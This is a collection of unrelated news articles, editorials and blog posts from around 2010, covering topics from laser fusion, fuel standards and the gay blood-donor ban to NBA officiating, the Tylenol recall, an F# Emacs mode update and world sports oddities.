Instead , it wants the bloggers to concentrate on writing free , exclusive content for the Post [...]
And the Post is getting all of this for FREE .
Every paid reporter at the Post should be up in arms over this .
Absolutely .
This fucks over the bloggers , and let 's the Post get away without hiring more reporters ( or even firing existing ones , if the program takes off ) .
The future of journalism might be hazy , but this certainly is n't the answer .

The world ’s largest laser is meant to spark off a fusion reaction this year – but do n’t bank on it .
So says the US government ’s watchdog in a critical report about the huge laser array at the National Ignition Facility ( NIF ) .
Despite crucial success in evenly compressing fusion fuel pellets earlier this year , the Lawrence Livermore National Laboratory ’s $ 3.5 billion array in Livermore , California , faces problems in repeating that success at the higher power needed for fusion , says a US Government Accountability Office ( GAO ) report .
First proposed in 1962 , laser fusion seeks to heat and compress hydrogen isotopes to the temperatures and pressures of the sun ’s interior , triggering nuclear fusion .
Livermore ’s version uses a two - stage process that mimics the triggering of a hydrogen bomb by firing synchronised pulses from 192 laser beams to generate a burst of X - rays that compress the fuel .
The symmetrical implosion requires a combined laser pulse energy of 0.7 megajoules .
Livermore physicists have said they hope to reach “ ignition ” – generating as much fusion energy as is contained in the laser pulse – at a laser energy of 1.2 to 1.3 megajoules , well short of NIF ’s 1.8 - megajoule capacity .

But the GAO says that many independent researchers think that ignition may require at least 1.8 megajoules , because plasma instabilities could deflect light away from the target .
The outside experts also warn that firing on full power could damage crucial high - power optics in the machine .
The GAO also complains that Livermore dragged its feet in commissioning an outside review panel that it recommended in 2005 .
Still , the GAO does not criticise NIF ’s operators as harshly as it did in 2000 .
It slammed the NIF for management failures that put it years behind schedule and billions over its original budget .
Lawrence Livermore told New Scientist that they are confident that they can achieve fusion with no more than 1.5 megajoules .
As the ruptured deep - water oil well in the Gulf of Mexico has reminded us , our national reliance on gasoline often comes with harsh side effects .
So we continue to appreciate the leadership President Barack Obama has shown in trying to make our cars and trucks dramatically more fuel - efficient and cleaner .
In bypassing Congress on Friday — but with significant buy - in from automakers — Obama said his goal was to cut automobile air pollution and fuel use in half within 20 years .
It ’s a heady goal , and one that will raise the price of vehicles .
But ultimately we think it ’s the right call , and will help prod automakers into making better vehicles .
The president ’s latest move basically improves upon his landmark effort last year to streamline a patchwork of differing regulations and present clear national standards for cars and light trucks .
The goal is to produce a vehicle fleet that averages 35.5 miles per gallon by 2016 .
His new directive orders the Environmental Protection Agency and the Department of Transportation to further strengthen those requirements and extend them beyond 2016 , but Obama did not specify new levels .
Further , the new directive would for the first time require the big rigs that haul the nation ’s freight to also meet fuel and emissions standards .
Another component of Obama ’s mandate frees up further federal support for research and development that could produce better technologies , such as making electric cars more attractive to consumers .
Yes , last year ’s mandate is expected to add as much as $ 1,300 to the cost of a new car , but depending on pump prices , it could be recouped since the cars would use less fuel .
The country could save 1.8 billion barrels of oil from 2012 , when the original mandate begins , to 2016 .
That equals a year ’s worth of oil imported from Saudi Arabia , Venezuela , Libya and Nigeria combined .
An odd confluence of events makes the president ’s unilateral actions possible .
In the past , it was up to Congress to establish so - called Corporate Average Fuel Economy standards .
But mammoth California and a coalition of 13 other states sought tougher standards .
Automakers argued for a uniform standard .
Meanwhile , both the National Highway Traffic Safety Administration and the EPA were developing standards .
Finally , Obama ’s decision to bail out and essentially nationalize two of the Big Three meant that the auto lobby suddenly lacked any real clout in Washington .
Opponents say Americans still want bigger cars and trucks and that efficiency standards will lead to smaller cars that wo n’t be as safe or comfortable .
We share some of those concerns , but trust the innovation and creativity automakers have displayed in recent years will remedy the situation .
Later this year , Nissan will begin sales of an all - electric sedan that seats five and travels 100 miles per charge .
The Chevy Volt plug - in hybrid promises to get 230 mpg in city driving .
It ’s due out this year .
Those innovations were n’t coming fast enough , and government needed to play a role to spur that creativity .
Cutting greenhouse gases and reducing the need for oil is a goal we share with this administration , and these policies make sense to us on many levels .

( CNN ) --
When Mark Shields started his job at the American Red Cross in Madison , Wisconsin , he rolled up his sleeve to give blood .
It made sense .
Part of his job was encouraging the public to donate and supporting the organization 's lifesaving mission .
Before he could give , he was told that his blood could never be accepted .
Because he 's gay .
" I was 23 at the time .
I was just coming out , " he said .
" I was trying to be part of our organization 's mission and feeling like I can't do this .
... I certainly felt put on the spot .
It was a bad feeling for a lot of reasons . "
Under Food and Drug Administration rules , men who have had sex -- even once -- with another man since 1977 are not permitted to give blood .
The rule was implemented in 1983 , sparked by concerns that HIV , the virus that causes AIDS , was tainting the blood supply .
Screening tests to identify HIV - positive blood had not been developed .
The policy was seen as a safety measure .
But today , with the availability of more accurate testing , activists , blood organizations and several U.S. senators say the lifetime ban is " medically and scientifically unwarranted " and are calling for change .
The Federal Advisory Committee on Blood Safety and Availability will consider the issue in meetings June 10 and 11 in Rockville , Maryland .
The committee makes recommendations to the secretary of the Department of Health and Human Services , which oversees the FDA .
Medical opinions vary ; some experts say that lifting the ban could pose health risks to blood recipients .
The Human Rights Campaign , the American Red Cross , America 's Blood Centers and AABB , formerly known as the American Association of Blood Banks , support easing the lifetime ban to allow gay blood donors .
In a joint statement , the blood organizations said that safety was the first priority and that potential donors should be screened more fairly , regardless of sexual orientation .
Special Coverage : Gay in America
About three months ago , Sen. John Kerry and 17 other senators signed a letter to the FDA blasting its " outdated " policy .
Gay men , including those who are in monogamous relationships , are forbidden from contributing blood for the rest of their lives , while " a heterosexual who has had sex with a prostitute need only wait a year [ before giving blood ] .
That does not strike me as a sound scientific conclusion , " Kerry wrote in a March 9 letter .
The FDA defended its current policy in an e-mailed statement to CNN.com :
The policy , it said , is " based on scientific data that show that certain medical , behavioral and geographical factors are associated with increased risk of transfusion transmitted diseases . "
The agency has been " taking into account the current body of scientific information , and we are considering the possibility of pursuing alternative strategies that maintain blood safety , " the statement said .
The FDA retained the ban on gay blood donors after reviewing the issue in 2000 and 2006 .
Health statistics show that men who have sex with men have a higher rate of diseases including HIV , syphilis and hepatitis B .
Gay men who would be likely to donate have an HIV prevalence that is over 15 times higher than that of the general population , according to the Centers for Disease Control and Prevention .
FDA : Blood donation questions and answers
" I do not see this being a gay rights issue , " said Dr. Jay Brooks , professor of pathology at the University of Texas Health Science Center in San Antonio , adding that he favors gay marriage and gays serving in the military .
The issue of blood donation has " nothing to do with someone being gay .
Any group that 's epidemiologically at risk of making blood unsafe , it 's unfortunate .
...
It 's a matter of epidemiology . "
The different standards between gay and straight people exists because the risk of HIV is much lower in heterosexuals , he said .
" The interest of the recipient is greater than any donor , " Brooks said .
" I 'd hate to tell the one person who got HIV through a blood transfusion , ' Sorry , we changed the regulation . ' "
These days , blood screenings are so effective in detecting diseases that the risk of such infection is very small , said Dr. Norbert Gilmore , a professor and clinician at the McGill University Health Center in Canada .
The blood donations go through HIV antigen screening ( to detect antibodies produced by the body in response to the virus ) and nucleic acid testing .
However , there is a " window period " for about two weeks after an individual becomes infected with HIV when these tests cannot detect the virus .
But that risk of this infection is " so small , we should look at the day - to - day realities rather than those infinitesimal risks , " said Gilmore , whose research published this week in the Canadian Medical Association Journal criticized the ban in Canada and the U.S. as unscientific .
The most important issue in this debate should be the safety of the patients , said Mark Skinner , president of the World Federation of Hemophilia .
" This is n't an issue just about HIV .
It is n't a gay issue , " he said .
" This is an issue that relates to safety in the blood supply .
Those decisions should be made on science , not based on societal concerns .
We readily recognize the MSM [ men who have sex with men ] ban is discriminatory , but it 's discriminatory for a reason .
" What we 're looking for is a thoughtful review .
We 're not opposed to the change .
We want to understand what additional risks patients might be asked to accept , " he said .
Shawn Decker , a hemophiliac who contracted HIV through contaminated blood products , said he supports allowing gay men to donate blood .

Potential donors should be screened based on risky behaviors such as unprotected sex or intravenous drug use , not sexual orientation , he said .
Decker said he was looking forward to a time when " those very allies and friends " in the gay community " are allowed to pony up and give the blood that is used to create my treatments for hemophilia . "
The F# mode for Emacs is two years old , and has been downloaded more than 1,000 times .
Several users have sent me emails and even a few patches .
It 's now time for an update .
If you have n't tried it yet , here are the main features :
Syntax highlighting .
Indentation .
The mode knows where blocks begin and end , and tries to correctly indent your code .
F# Interactive support .
You can easily send your code to fsi and get the result .
And here are changes since the last release :
The infinite loop with the indentation of " else " ( and some other keywords ) is removed !
I think that was the painful problem with the F# mode .
The paths to fsi.exe and fsc.exe can now have spaces .
This makes the installation on Windows much easier .
Thanks to Jens Horstmeier !
When you send an expression to fsi , error messages now display the real location in your source code ( instead of " stdin " ) .
Error messages from fsc.exe are now parsed correctly , so that you can use next - error functions ( C - x` by default ) .
Error messages from fsi.exe are also parsed .
The interactive buffer now uses compilation - minor - mode to highlights errors .
Improve default key bindings .
Update the graphical menu bar to make it more user - friendly .
Fix coloration issues .
In particular , Caml - style comments are correctly handled , even when nested and over multiple lines .
" Old - style backquotes " warning from Emacs 22 is removed .

Tim Donaghy , the former NBA referee who spent 11 months in prison for relaying inside information to gamblers , is reviewing the performance of his former colleagues during the NBA Finals .
Here 's a quarter - by - quarter breakdown of Game 7 , with video .
Advertisement
Game 1 | Game 2 | Game 3 | Game 4 | Game 5 | Game 6 | Game 7
Advertisement
The big thing that stands out about the series is how dramatically the officiating changed after the first two games .
In Games 1 and 2 , the referees handed out fouls like candy — 54 were called in the opener , 58 in the next game .
Over the remainder of the series , refs called an average of 44 fouls .
What happened ?
Well , I can say from experience that it had nothing to do with the play on the floor and a lot more to do with what happened in a hotel room the morning of every game .
Here 's how it works :
In the playoffs , three refs and an alternate meet in a hotel room with a group supervisor before a game .
The league office e-mails the supervisor a list of things it wants the officials to concentrate on , and the supervisor relays the message to the refs in their meeting .
When I was in the league , the memos — hot off the desks of the likes of Stu Jackson , Ed T. Rush , or Ronnie Nunn — would usually detail what kinds of fouls needed to be better addressed .
The message would be something like , Team X is getting away with an enormous amount of handchecking , or Shawn Bradley is hanging out under the basket , not really defending anybody .
He 's committing a defensive three - second violation .
The goal was to set the tone for that night 's game and , even more broadly , for the series .
An extreme example : the 2005 Dallas - Houston matchup .
I was the alternate for Game 3 and sat in on the meeting with the group supervisor .
We were told explicitly to start calling moving screens and traveling violations on Yao Ming .
( Jeff Van Gundy would later complain publicly that referees were targeting Yao ; he got fined for it . )
Houston was up 2 - 0 at that point .
Dallas wound up winning in seven games .
So what do I think happened after Games 1 and 2 this year ?
I 'm pretty certain that the message from the league office before Game 3 was to swallow the whistle and cut down on the number of fouls called .
To let the games play out , in other words .
Throughout the Finals , I 've tried to give you some insight into the inherent subjectivity of refereeing a professional basketball game .
But the takeaway from this series is that the subjectivity is n't just on the part of the referees .
The league itself also has a huge influence in how a series plays out — through those memos and their points of emphasis .
Maybe you think it 's completely innocent .
Maybe you do n't .
But there 's no denying that what the rule book says means a lot less than what the NBA wants at any given moment .

Avigdor Lieberman , Israel ’s far - right foreign minister , set out last week what he called a “ blueprint for a resolution to the conflict ” with the Palestinians that demands most of the country ’s large Palestinian minority be stripped of citizenship and relocated outside Israel ’s future borders .
Warning Israel faced growing diplomatic pressure for a full withdrawal to the Green Line , the pre-1967 border , Lieberman said that , if such a partition were implemented , “ the conflict will inevitably pass beyond those borders and into Israel . ”
He accused many of Israel ’s 1.3 million Palestinian citizens of acting against Israel while their leaders “ actively assist those who want to destroy the Jewish state . ”
Lieberman ’s Yisrael Beiteinu party campaigned in last year ’s elections on a platform of “ No loyalty , no citizenship ” and has proposed a raft of loyalty laws over the past year targeted at the Palestinian minority .
True peace , the foreign minister claimed , would come only with land swaps , or “ an exchange of populated territories to create two largely homogeneous states , one Jewish Israeli and the other Arab Palestinian . ”
He added that under his plan “ those Arabs who were in Israel will now receive Palestinian citizenship . ”
Unusually , Lieberman , who is also deputy prime minister , offered his plan in a commentary for the English - language Jerusalem Post daily newspaper , apparently in an attempt to make maximum impact on the international community .
He has spoken repeatedly in the past about drawing the borders in a way to forcibly exchange Palestinian communities in Israel for the Jewish settlements in the West Bank .
But under orders from Benjamin Netanyahu , the prime minister , he has kept a relatively low profile on the conflict ’s larger issues since his controversial appointment to head the foreign ministry more than a year ago .
In early 2009 , Lieberman , who lives in the West Bank settlement of Nokdim , upset his own supporters by advocating the creation of “ a viable Palestinian state , ” though he has remained unclear about what it would require in practice .
Lieberman ’s revival of his “ population transfer ” plan — an idea he unveiled six years ago — comes as the Israeli leadership has understood that it is “ isolated like never before , ” according to Michael Warschawski , an Israeli analyst .
Netanyahu ’s government has all but stopped paying lip service to US - sponsored “ proximity talks ” with the Palestinians after outraging global public opinion with attacks on Gaza 18 months ago and on a Gaza - bound aid flotilla four weeks ago in which nine peace activists were killed .
Israel ’s relations with the international community are likely to deteriorate further in late summer when a 10 - month partial freeze on settlement expansion in the West Bank expires .
Last week , Netanyahu refused to answer questions about the freeze , after a vote by his Likud party ’s central committee to support renewed settlement building from late September .
Other looming diplomatic headaches for Israel are the return of the Goldstone report , which suggested Israel committed war crimes in its attack on Gaza , to the United Nations General Assembly in late July , and Turkey ’s adoption of the rotating presidency of the Security Council in September .
Warschawski , a founder of the Alternative Information Center , a joint Israeli - Palestinian advocacy group , said that , faced with these crises , Israel ’s political elite had split into two camps .
Most , including Lieberman , believed Israel should “ push ahead ” with its unilateral policies towards the Palestinians and refuse to engage in a peace process regardless of the likely international repercussions .
“ Israel ’s ruling elite knows that the only solution to the conflict acceptable to the international community is an end to the occupation along the lines of the Clinton parameters , ” he said , referring to the two - state solution promoted by former US president Bill Clinton in late 2000 .
“ None of them , not even Ehud Barak [ the defense minister and head of the centrist Labor Party ] , are ready to accept this as the basis for negotiations . ”
On the other hand , Tzipi Livni , the head of the center - right opposition Kadima party , Warschawski said , wanted to damp down the international backlash by engaging in direct negotiations with the Palestinian leadership in the West Bank under Mahmoud Abbas .
Lieberman ’s commentary came a day after he told Livni that she could join the government only if she accepted “ the principle of trading territory and population as the solution to the Palestinian issue , and give up the principle of land for peace . ”
Lieberman is reportedly concerned that Netanyahu might seek to bring Livni into a national unity government to placate the US and prop up the legitimacy of his coalition .
The Labor Party has threatened to quit the government if Kadima does not join by the end of September , and Livni is reported to want the foreign ministry .
Lieberman ’s position is further threatened by a series of corruption investigations .
However , he also appears keen to take the initiative from both Washington and Livni with his own “ peace plan . ”
An unnamed aide to Lieberman told the Jerusalem Post that , with a vacuum in the diplomatic process , the foreign minister “ thinks he can convince the government to adopt the plan . ”
However , Warschawski said there were few indications that Netanyahu wanted to be involved in any peace process , even Lieberman’s .
Last week Uzi Arad , the government ’s shadowy national security adviser and a long - time confidant of Netanyahu , made a rare public statement at a meeting of the Jewish Agency in Jerusalem to attack Livni for “ political adventurism ” and believing in the “ magic ” of a two - state solution .
Apparently reflecting Netanyahu ’s own thinking , he said : “ The more you market Palestinian legitimacy , the more you bring about a detraction of Israel ’s legitimacy in certain circles .
[ The Palestinians ] are accumulating legitimacy , and we are being delegitimized . ”
Warschawski doubted that Lieberman believed his blueprint for population exchanges could be implemented but was promoting it chiefly to further damage the standing of Israel ’s Palestinian citizens and advance his own political ambitions .
In his commentary , Lieberman said the international community ’s peace plan would lead to “ the one - and - a - half to half state solution ” : “ a homogeneous , pure Palestinian state , ” from which Jewish settlers were expelled , and “ a binational state in Israel , ” which included many Palestinian citizens .
Palestinians , in both the territories and inside Israel , he said , could not “ continue to incite against Israel , glorify murder , stigmatize Israel in international forums , boycott Israeli goods and mount legal offensives against Israeli officials . ”
International law , he added , sanctioned the partition of territory in which ethnic communities were broken up into different states , including in the case of the former Yugoslavia .
“ In most cases there is no physical population transfer or the demolition of houses , but creating a border where none existed , according to demographics , ” he wrote .
Surveys have shown that Palestinian citizens are overwhelming opposed to “ population transfer ” schemes like Lieberman’s .
Critics note that Lieberman has failed to show how the many Palestinian communities inside Israel that are located far from the Green Line could be incorporated into a Palestinian state without expulsions .
Legal experts also point out that , even if Israel managed to trade territory as part of a peace agreement , stripping Palestinians of their Israeli citizenship as a result of such a deal would violate international law .

Tylenol recall : Serious side effects investigated
NEW YORK ( CNNMoney.com ) --
The Food and Drug Administration is looking into reports of at least 775 serious side effects from drugs recalled by McNeil , a division of Johnson & Johnson , according to a source close to a Congressional investigation .
Included in the reports were 30 deaths , nearly all of which were found to not be tied to McNeil 's recall of Tylenol , Motrin and Benadryl drugs from Jan. 1 , 2008 through April 30 , 2010 , according to another source close to the investigation .
The FDA is also investigating reports of several hundred serious side effects -- or " adverse events " -- and seven deaths since May 1 , when McNeil recalled 50 children 's versions of these non-prescription medicines because of serious quality and safety concerns .
The FDA 's investigation into the recalls is ongoing and the agency would not comment on the matter .
Adverse event reports are consumer complaints of a serious side effect associated with the use of a medical product , according to the FDA .
Adverse events could include death , hospitalization , disability and other health complications .
The House Committee on Oversight and Government Reform has scheduled a hearing on May 27 to examine the recall .
Following the most recent recall , Johnson & Johnson ( JNJ , Fortune 500 ) has suspended production at McNeil 's facility in Fort Washington , Penn. , that manufactured the children 's drugs .
McNeil 's latest recall is its fourth in the past seven months :
In November 2009 , five lots of Tylenol Arthritis Pain 100 count with the EZ - open cap were recalled for unusual odor leading to nausea , stomach pain , vomiting and diarrhea .
In December , the recall was expanded to include all product lots of Tylenol Arthritis Pain caplet 100 count bottles with the red EZ - open cap .
In January 2010 , the recall was widened to an undisclosed number of Tylenol , Motrin and other over - the - counter drugs after complaints of consumers feeling sick from an odor .
McNeil has maintained that its recall of the children 's drugs was not " undertaken on the basis of adverse medical events " but as a precautionary measure .
" We track all adverse events and thoroughly investigate all serious adverse cases that are reported and , in turn , report these to the FDA , whether or not the event may be caused by our products , " McNeil said in a statement Tuesday .
The FDA , which earlier this month issued a scathing 17 - page inspection report listing 20 violations at the Fort Washington plant , also maintains that the recalled drugs pose a " remote " potential for serious health problems .
The House panel invited Johnson & Johnson Chief Executive William Weldon to testify but he declined to be present due to health reasons .
The Committee said Colleen Goggins , worldwide chairman of Johnson & Johnson 's consumer group will testify at the hearings .
The FDA said Dr. Joshua Sharfstein , principal deputy Commissioner , Deborah Autor , Director of the office of compliance and Michael Chappell , acting commissioner for regulatory affairs , will testify on behalf of the agency .
Banks which charge unfair mortgage exit fees face a crackdown from the Australian Securities and Investments Commission ( ASIC ) .
From July 1 , ASIC will also have the power to go after institutions which seek to rebadge current exit fees as upfront entry fees .
Treasurer Wayne Swan and Financial Services Minister Chris Bowen said these new powers would make it easier for borrowers to switch to a competitor offering a cheaper rate , providing a major boost for competition in the mortgage market .
" Currently , some banks are using mortgage exit fees to lock customers into their home loans , " Mr Swan and Mr Bowen said in a statement on Sunday .
" Exit fees can be so high that there is no incentive to switch to another lender , even if they are offering a substantially lower interest rate .

A 2 - year - old octopus born in England but raised in Germany , has predicted a German win over England in Sunday 's World Cup game .
Paul chose a mussel out of a container marked with the German flag over a mussel in a glass with the English St. George 's Cross , said Tanja Munzig , a spokeswoman for the Sea Life Aquarium in the western city of Oberhausen , Germany , on Friday .
Now before you laugh and say " Psychic octopus ?
Preposterous . " consider this :
Paul already had successfully predicted Germany 's victories over Australia and Ghana , and its loss to Serbia .
Who are we to argue with a psychic octopus ?
They may as well cancel the match .
Germany will win .

A Memphian ’s Guide to Watching “ Memphis Beat ”
First , you must learn to ignore the factual errors .
“ Memphis Beat ” , TNT ’s new procedural cop drama set in the Bluff City is full of them .
The convenience store at the beginning of the show sells both hard liquor and beer ( not in real Tennessee , it does n’t ) , Jason Lee ’s character refers to a neighborhood as a “ ward ” , and locals know that Gus ’s fried chicken comes in a greasy paper bag , not a box .
Also , if anyone knows where the Memphis County referenced on the police badges is , I ’d kind of like to go there .
Secondly , you have to understand that this is TV Memphis , not Real Memphis .
Cliches abound .
The show opens and closes with Dwight performing Elvis songs with his band .
Biscuits are eaten , there is a Sassy Black Lady Detective , and the stairs at the police station are inexplicably occupied by a handful of Asian Elvis lookalikes in shiny gold jackets .
Those things aside , “ Memphis Beat ” is enjoyable , if a little bland .

Lee dusts off his “ My Name is Earl ” accent to play Dwight , a quirky mama ’s boy detective who spends his days using his instincts to solve crimes and his evenings fronting an Elvis tribute band .
I could n’t help but like Lee as he tried to solve an elder abuse case involving a former WHER DJ .
The supporting cast is equally lovable .
After watching the first episode , I hope that the writers continue to develop them as characters rather than stereotypes .
DJ Qualls ( who was also in “ Hustle & Flow ” ) is played for laughs as Dwight ’s bumbling underling .
I ’m also curious to see where the writers will take Tanya Rice , the tough new boss played by Alfre Woodard .
She ’s talented enough to be so much more than the Sassy Lady Cop .
Since the show was announced , there ’s been a fair amount of uproar in Memphis over the show ’s filming location .
While some exterior shots were filmed in Memphis , the majority of the show was shot in New Orleans because of the tax incentives that Louisiana gives to filmmakers .
I was hoping that it would n’t matter in the show ’s final product – that it would be easy to believe that the interior shots or bad neighborhoods were ours .
Like Memphis , New Orleans has a personality and look that ’s all its own , and it shows .
There ’s just something subtly off about the setting .
It ’s little things that people outside of Memphis wo n’t notice – the light , the skyline shot that looks like here but is n’t , the blue street signs – but that locals will find distracting .
I ’m willing to give the show time , though .
Last night was just the first episode , and viewers have to be willing to forgive a show its pilot .
“ Memphis Beat ” could ( and probably will ) get better with time .
Ultimately , a show like “ Memphis Beat ” will do more good than harm .
Like it or not , our name and our culture ( and yes , our cliches ) are the subject of a national television show .
If the show runs long enough or ever has the budget to do so , maybe they ’ll dig a little deeper into the soul of the place and make “ Memphis Beat ” something that we can watch with pride .

GRAND JUNCTION —
A national group that thinks global warming is “ junk science ” and that teaching it is unnecessarily scaring schoolchildren brought its first petition effort for “ balanced education ” to Mesa County Schools on Tuesday night .
Rose Pugliese , an unsuccessful candidate for a District 51 school board seat in the last election , presented a petition with 700 signatures to the board asking that science teachers stop giving lessons on global warming .
Pugliese , a 32 - year - old Grand Junction attorney and activist in Tea Party and conservative Republican groups , also presented a petition with 600 signatures demanding Mesa County schools keep political views out of classrooms .
Pugliese ’s efforts have made her the poster girl for the group Balanced Education for Everyone and have pinpointed Mesa County as a national test case for keeping the teaching of humans ’ influence on global warming out of science classes .
“ It ( global warming ) is not a proven scientific theory .
There is not evidence to support it , ” Pugliese told the board , generating applause from about 40 Tea Party and other conservative group members who filled the room for the first school board petition battle over this issue in the country .
The climate - change deniers scoffed and shook their heads when a scientist and a college professor spoke up to say that global warming is a well - supported scientific fact .
“ This is not just some liberal theory , ” said Richard Alward , an ecologist with a Ph.D .
Tamera Minnick , an associate professor in environmental science at Mesa State College , had the audience tittering when she told the board that global warming is as certain a scientific theory as those describing relativity , gravity and evolution .
Pugliese and three other people who spoke against global - warming education said that if the subject is going to be taught , the “ other side ” should be presented so that students are n’t subjected to a frightening untruth .
World to “ melt away ”
“ A survey showed two out of three kids were coming home thinking their world is going to melt away and all the polar bears are going to die , ” Laura Kindregan told the board .
The Denver resident came to the meeting to promote Balanced Education for Everyone .
The movement began a campaign in April to remove the teaching of man-made global warming from science classes .
The group focused on Grand Junction for its inaugural effort when Pugliese agreed to start a petition drive .
School board members accepted the petition and listened to the presentation but took no action .
“ We ’ll have to look at state curriculum and state standards and see what policies are already in place , ” said board member Greg Mikolai .
Board member Harry Butler said this is the first time he has heard a complaint alleging that teachers are espousing too many liberal ideas in classrooms .
Since Pugliese wrapped up her petition drive and was prominently featured on the Balanced Education for Everyone website and Facebook page , the notion of putting an end to global - warming education has begun to gain traction .
A parent in Las Vegas has started a petition campaign .
Closer to home , parents in Franktown and Littleton have also complained on the movement ’s website about the “ liberal madness ” in Colorado schools .
Balanced Education for Everyone was formed by the conservative Independent Women ’s Forum , which heavily promotes the documentary “ Not Evil Just Wrong ” as the basis for classroom lesson plans and also as the “ scientifically accurate ” truth about global warming .
The video was created as a counterpoint to Al Gore ’s Oscar - winning global - warming documentary , “ An Inconvenient Truth . ”
Brenda Ekwurzel , a climate scientist with the Union of Concerned Scientists , said she finds the “ Not Evil Just Wrong ” curriculum push “ very troubling ” because the majority of scientists around the world agree that global warming is accelerating because of the effect of human activities on top of a natural cycle of warming .
“ To keep this information out of schools is really anti-education , ” Ekwurzel said .
“ It seems to me what is equivalent would be teaching that if you smoke tobacco , there is no risk you will ever develop cancer . ”
Pugliese said she personally does n’t think global warming should be talked about at all in schools .
And she is not in favor of showing movies in classrooms .
But she said she took up the Balanced Education for Everyone issue when , while running for school board , parents approached her to complain that their children could n’t freely express their conservative values in class .
Put in moral dilemma
She said one student was placed in a moral dilemma when he encountered a CSAP question and knew the “ correct ” answer was “ global warming , ” while not believing that was true .
Pugliese told the board she will return in several months “ to see where you guys are at . ”
One of her supporters , Doug Thompson , warned the board that “ the people of this community are watching , and we want to see change . ”
He said failure to act could have consequences in the next board elections .
Pugliese , who has the backing of Colorado State Board of Education member Marcia Neal , said she hopes to expand her campaign to attack curriculum issues on a larger scale .
“ This is just a small battle in a larger battle , ” Pugliese said .
“ I really hope this inspires more people to get involved in our schools . ”

It does n't do to upset the Canadians – and with an axe to grind they are going after London 's Olympic double act
Much ado about Wenlock and Co
" Wow all this attention is amazing , " tweeted the new Olympic icon Wenlock , as he and co-mascot Mandeville were unveiled to the world on Wednesday .
They 'll need to stay optimistic as it appears that , in one country at least , their cards have already inadvertently been marked by the British press .
It does n't do to upset the Canadians and , with an axe to grind , they 're going after London 's double act .
Still bristling after negative reports of this year 's Winter Olympics in Vancouver the Canadian press have united behind what they see as a chance to return the favour .
Calgary 's Herald opened the offensive , commenting : " London 's creepy one - eyed Olympic mascots scare us .
Especially the one with the blue stain on its crotch " ( Mandeville ) , before joyously reporting that : " One kid on Twitter called the London mascots ' terror sperm ' . "
The National Post weighed in under the headline : " Who 's laughing now , London ? " referring to them as " walking alien penis creatures " .
This was a popular image , the Toronto Sun describing " terrifying penis monsters " and the Montreal Gazette warning : " If you 've yet to see photos of the mascot couple ... Keep the young children away . "
The Globe and Mail united their opprobrium with current affairs , quoting the industry minister Tony Clement 's tweet : " Saw the pic of the UK mascots .
See what happens when you create a coalition ? " while the Vancouver Sun turned the approbation global under the banner : " World unites online against London 's Olympic mascots " , noting their " disturbing resemblance to partly blinded Teletubbies " before asking the hapless victims outside for a fight : " It 's safe to say [ Vancouver 's ] 2010 mascot Quatchi could kick their alien butts . "
Even the papers that avoided overt editorialising twisted the knife .
The Ottowa Citizen followed their headline " London Olympic Games mascots are met with derision " with a round - up of abusive online comments , while British Columbia 's the Province simply quoted locals : " ' They do n't look like anything , ' said Patchen Gallagher , before remembering where he was and focusing on the party line :
' It looks like someone spat on the ground and laid a Union Jack over it . ' "
A day later Wenlock tweeted again : " We 're glad to be here , there 's going to be lots to do ... "
There certainly is , and let 's hope they can cope , as by the end of the week even Vanity Fair joined in : " Meet the London 2012 Olympic mascot , a ghoulish cycloptic phallus named Wenlock . "
France : Chanting and protests as PSG fans disrupt Euro bid
France 's bid to stage Euro 2016 took a dent last week not because of inadvertent Lord Triesmann - style disclosures but because of rowdy sabotage by – who else – Paris Saint - Germain fans .
As Frédéric Thiriez , the president of the Ligue de Football Professionnel , was speaking at a press conference to explain why the country would be the perfect hosts , dozens of PSG fans stormed the auditorium and began chanting " Our taxes are n't for the Euros ! " ( footage at : tiny.cc/4eas6 ) before moving on to the real reason for their intrusion : to protest against the perceived bias of the authorities when it comes to clamping down on hooliganism in Paris .
The intruders were all regulars in the Auteuil end of the Parc des Princes and are convinced that they have been more harshly dealt with than the neo - Nazis that gather at the opposite end .
" You do n't scare me ! " insisted Thiriez before he and French Football Federation president Jean - Pierre Escalettes walked out .
" How do you plan to host the Euros when you can't even stop 150 fascists from provoking people in the Auteuil stand ? " shouted one protester , prompting an obvious follow - up question : how do you plan to host the Euros when you can't even stop 50 fans from the Auteuil from aborting a press conference ?
Meanwhile in the French capital there was better news for non-league side Paris FC , who are set to be awarded three points for the match they lost 3 - 0 to AS Saint - Ouen - l' Aumône ( Assoa ) last October after it emerged that their opponents fielded an impostor .
Having hired a private investigator to confirm their suspicions , Paris FC now say they have proof that the Assoa player Adilson Tavares was , in fact , Jean - Claude Semedo Gonçalves , who was banned for five years in 2006 for " exceptional on - pitch violence " .
Legal proceedings are under way and the outcome will effect both teams ' hopes of promotion to France 's fifth tier : Assoa currently lead their league by two points – from Paris FC .
Kenya : Waitresses , beer and balls unite for charity
FThe former Kenya and AFC Leopards players Mike Amwayi and Peter Lichungu are among the ex-international footballers that are now playing in the Wazee Pamoja league , a four - team charity competition where , in flagrant contradiction of Fifa rules regarding alcohol , " the only rule that seems to apply with abandon is that of the bottle " , reports the Standard .
" Players , most of them middle - aged men , kick the ball , then dash to the touchline to sip from their bottles , while substitutes on the bench and managers are served throughout the match .
The liquor is readily available , courtesy of a mobile bar that is managed by the waitresses who run up and down the pitch serving players . "
The dream of many a Sunday - leaguer , it seems , has come true : " One player - manager played for a few minutes holding his beer bottle then rested for a while to finish his drink . "
But there is a serious side to it too .
Founder member Onyino Mukobe says the group 's main objective is to do charity work within Nairobi .
The team physiotherapist Jonah Chitira told the Standard : " Our motto is ' relinquish one beer to help others ' .
That way we manage to raise charity funds . "
The 50 - year - old Amwai also hailed the initiative , saying it helps the players keep fit as they raise money .
It seems to be working , as the league recently raised 50,000 Kenyan shillings ( £ 450 ) to look after 12 needy patients who had been detained at Pumwani maternity hospital .
Appropriately , the teams are named after , and based around , bars for this unique competition – " It is notable that as the match progresses , many players keep stumbling and falling as they chase the ball , " says the Standard .
United States : Supreme surfer catches wave from Washington
Congratulations are in order for surfer Kelly Slater ( below ) this week , says Florida Today , as the US House of Representatives unanimously passed a bipartisan resolution honouring the nine - times world champion for his wave ‑wrangling achievements .
" It ranks high , mainly because it was unexpected , " Slater said .
" Not just to be recognised in a political way , but in a public way .
That 's a huge honour .
No one voted against it . "
" He is unmatched , unparalleled in the world of surfing , " the Florida Republican Bill Posey , who sponsored the resolution , told FT .
" Obviously , he is an inspiration to many . "
Not least the various sponsors of surfing in the US , who find their brands featured in the resolution , included in a list of his achievements – mainly major surfing events that they were promoting and that he had won .
As well as honouring Slater , then , resolution 792 has also enshrined Billabong ( three times ) , Rip Curl ( twice ) and O'Neill and Quicksilver ( one apiece ) .
Lobster Dogs !
